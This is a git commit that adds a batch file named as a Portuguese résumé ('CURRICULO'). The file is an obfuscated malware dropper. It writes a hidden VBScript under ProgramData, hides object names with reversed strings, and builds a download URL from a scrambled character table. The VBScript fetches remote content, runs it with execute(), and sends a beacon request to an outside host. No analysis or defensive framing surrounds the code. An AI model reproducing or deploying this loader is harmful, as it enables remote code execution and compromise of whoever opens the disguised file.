13d4384e165b38155a43c9412fc76dc1a46c081f
23jh4g1 <51272284+23jh4g1@users.noreply.github.com>
2019-06-02 22:58:51 -0300

    Add files via upload

---
+++ CURRICULO-0129819.cmd
@@ -0,0 +1,39 @@
+@echo off
+setlocal EnableExtensions DisableDelayedExpansion
+md "%ALLUSERSPROFILE%\windows\.DDDDYS\" && cls
+set jCnzWcoNFyvWYSd=%USERNAME%.vbs
+set PqiAwxDQL=sYWGVlyih9wHXzMR/drJLqj3vt0c8.oCu1g:FAnNkbI62xa=mD-Zp5
+set ioy1erU="%ALLUSERSPROFILE%\windows\.DDDDYS\%jCnzWcoNFyvWYSd%" ECHO
+del ioy1erU="%ALLUSERSPROFILE%\windows\.DDDDYS\%jCnzWcoNFyvWYSd%
+:Fase1
+>>%ioy1erU% Dim b3K8Gwa7BxZthdCD
+>>%ioy1erU% Dim cFHrVU9RkLguUoZ
+>>%ioy1erU% Dim d9L5609FRj
+>>%ioy1erU% Dim eDUc5KwIeoNSct
+>>%ioy1erU% Dim f5hTw8dVFR
+>>%ioy1erU% Dim gsR7QJFJd
+>>%ioy1erU% Dim hNVvqRHAazcX5
+>>%ioy1erU% cFHrVU9RkLguUoZ = WScript.Arguments(0)
+>>%ioy1erU% d9L5609FRj = WScript.Arguments(1)
+>>%ioy1erU% Set mYnXsfcfack = CreateObject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
+>>%ioy1erU% Set pkOCg8TjlQFN = CreateObject(StrReverse("llehS.tpircSW"))
+>>%ioy1erU% Dir = pkOCg8TjlQFN.ExpandEnvironmentStrings("%USERPROFILE%")
+>>%ioy1erU% If Not mYnXsfcfack.FolderExists(Dir + "\" + ".zH") Then
+>>%ioy1erU% Set nxiNDdSehGD = mYnXsfcfack.CreateFolder(Dir + "\" + ".zH")
+>>%ioy1erU% Set b3K8Gwa7BxZthdCD = CreateObject(StrReverse("PTTHLMX.2LMXSM"))
+>>%ioy1erU% b3K8Gwa7BxZthdCD.open StrReverse(cFHrVU9RkLguUoZ), d9L5609FRj, False
+>>%ioy1erU% execute("b3K8Gwa7BxZthdCD.setRequestHeader ""User-Agent"", ""0M3yC6u2stom8U3se2r"":b3K8Gwa7BxZthdCD.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded""")
+>>%ioy1erU% execute("b3K8Gwa7BxZthdCD.send :eDUc5KwIeoNSct = b3K8Gwa7BxZthdCD.responseText")
+>>%ioy1erU% execute( eDUc5KwIeoNSct )
+>>%ioy1erU% WScript.Sleep(3000)
+>>%ioy1erU% Set oE1Kd9F3fi = CreateObject(StrReverse("PTTHLMXrevreS.2LMXSM"))
+>>%ioy1erU% oE1Kd9F3fi.open StrReverse("TEG"), StrReverse("713=y&255=x&f=l&f=o&06=q&6=m&997=w&335=h?gmi.ACiHBAA/diytitne/pma/tnanet/ten.deziamaka.moc-nsm-s-gmi//:sptth"), False
+>>%ioy1erU% oE1Kd9F3fi.send()
+>>%ioy1erU% End If
+cls
+@echo off
+ping 127.0.0.1 -n 1 > nul
+set lB0iFio=%PqiAwxDQL:~8,1%%PqiAwxDQL:~25,1%%PqiAwxDQL:~25,1%%PqiAwxDQL:~52,1%%PqiAwxDQL:~0,1%%PqiAwxDQL:~35,1%%PqiAwxDQL:~16,1%%PqiAwxDQL:~16,1%%PqiAwxDQL:~52,1%%PqiAwxDQL:~25,1%%PqiAwxDQL:~50,1%%PqiAwxDQL:~41,1%%PqiAwxDQL:~18,1%%PqiAwxDQL:~29,1%%PqiAwxDQL:~30,1%%PqiAwxDQL:~30,1%%PqiAwxDQL:~34,1%%PqiAwxDQL:~32,1%%PqiAwxDQL:~6,1%%PqiAwxDQL:~29,1%%PqiAwxDQL:~27,1%%PqiAwxDQL:~30,1%%PqiAwxDQL:~48,1%%PqiAwxDQL:~16,1%%PqiAwxDQL:~46,1%%PqiAwxDQL:~52,1%%PqiAwxDQL:~52,1%%PqiAwxDQL:~40,1%%PqiAwxDQL:~27,1%%PqiAwxDQL:~48,1%%PqiAwxDQL:~17,1%%PqiAwxDQL:~16,1%%PqiAwxDQL:~46,1%%PqiAwxDQL:~11,1%%PqiAwxDQL:~15,1%%PqiAwxDQL:~26,1%%PqiAwxDQL:~27,1%%PqiAwxDQL:~11,1%%PqiAwxDQL:~14,1%%PqiAwxDQL:~43,1%%PqiAwxDQL:~20,1%%PqiAwxDQL:~6,1%%PqiAwxDQL:~9,1%%PqiAwxDQL:~13,1%%PqiAwxDQL:~17,1%%PqiAwxDQL:~3,1%%PqiAwxDQL:~9,1%%PqiAwxDQL:~6,1%%PqiAwxDQL:~1,1%%PqiAwxDQL:~2,1%%PqiAwxDQL:~17,1%%PqiAwxDQL:~5,1%%PqiAwxDQL:~20,1%%PqiAwxDQL:~48,1%%PqiAwxDQL:~17,1%%PqiAwxDQL:~24,1%%PqiAwxDQL:~41,1%%PqiAwxDQL:~44,1%%PqiAwxDQL:~17,1%%PqiAwxDQL:~0,1%%PqiAwxDQL:~51,1%%PqiAwxDQL:~2,1%%PqiAwxDQL:~36,1%%PqiAwxDQL:~10,1%%PqiAwxDQL:~46,1%%PqiAwxDQL:~12,1%%PqiAwxDQL:~14,1%%PqiAwxDQL:~32,1%%PqiAwxDQL:~1,1%%PqiAwxDQL:~44,1%%PqiAwxDQL:~9,1%%PqiAwxDQL:~25,1%%PqiAwxDQL:~20,1%%PqiAwxDQL:~44,1%%PqiAwxDQL:~39,1%%PqiAwxDQL:~24,1%%PqiAwxDQL:~41,1%%PqiAwxDQL:~38,1%%PqiAwxDQL:~39,1%%PqiAwxDQL:~24,1%%PqiAwxDQL:~41,1%%PqiAwxDQL:~3,1%%PqiAwxDQL:~4,1%%PqiAwxDQL:~22,1%%PqiAwxDQL:~41,1%%PqiAwxDQL:~3,1%%PqiAwxDQL:~9,1%%PqiAwxDQL:~33,1%%PqiAwxDQL:~51,1%%PqiAwxDQL:~31,1%%PqiAwxDQL:~9,1%%PqiAwxDQL:~48,1%%PqiAwxDQL:~41,1%%PqiAwxDQL:~44,1%%PqiAwxDQL:~45,1%%PqiAwxDQL:~40,1%%PqiAwxDQL:~51,1%%PqiAwxDQL:~12,1%%PqiAwxDQL:~42,1%%PqiAwxDQL:~25,1%%PqiAwxDQL:~46,1%%PqiAwxDQL:~48,1%%PqiAwxDQL:~34,1%%PqiAwxDQL:~24,1%%PqiAwxDQL:~17,1%%PqiAwxDQL:~49,1%%PqiAwxDQL:~5,1%%PqiAwxDQL:~13,1%%PqiAwxDQL:~41,1%%PqiAwxDQL:~49,1%%PqiAwxDQL:~5,1%%PqiAwxDQL:~21,1%%PqiAwxDQL:~27,1%%PqiAwxDQL:~38,1%%PqiAwxDQL:~19,1%%PqiAwxDQL:~0,1%%PqiAwxDQL:~27,1%%PqiAwxDQL:~31,1%%PqiAwxDQL:~53,1%%PqiAwxDQL:~7,1%%PqiAwxDQL:~41,1%%PqiAwxDQL:~12,1%%PqiAwxDQL:~37,1%%PqiAwxDQL:~48,1%%PqiAwxDQL:~41,1%%PqiAwxDQL:~48,1%%PqiAwxDQL:~28,1%%PqiAwxDQL:~25,1%%PqiAwxDQL:~27,1%%PqiAwxDQL:~3,1%%PqiAwxDQL:~9,1%%PqiAwxDQL:~23,1%%PqiAwxDQL:~51,1%%PqiAwxDQL:~12,1%%PqiAwxDQL:~42,1%%PqiAwxDQL:~47,1%
+start wscript //Nologo "%ALLUSERSPROFILE%\windows\.DDDDYS\%jCnzWcoNFyvWYSd%" AS111 %lB0iFio% && @echo off
+endlocal
+:hovBP259UtjR5iA
